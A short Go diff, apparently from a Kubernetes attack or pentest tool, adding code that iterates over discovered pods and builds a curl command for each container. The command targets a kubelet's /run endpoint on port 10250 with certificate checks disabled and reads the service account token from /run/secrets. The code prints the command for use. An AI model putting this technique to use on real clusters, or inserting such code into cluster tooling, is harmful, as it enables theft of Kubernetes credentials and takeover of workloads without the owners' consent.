@@ -1582,6 +1582,8 @@ func GetNodeIP(connectionString ServerInfo) {
 									PodNamespace:  podNamespace,
 									ContainerName: containerName,
 								})
+								cmdline := "curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /run/secrets/kubernetes.io/serviceaccount/token\""
+								println(cmdline)
 							}
 						}
 					}
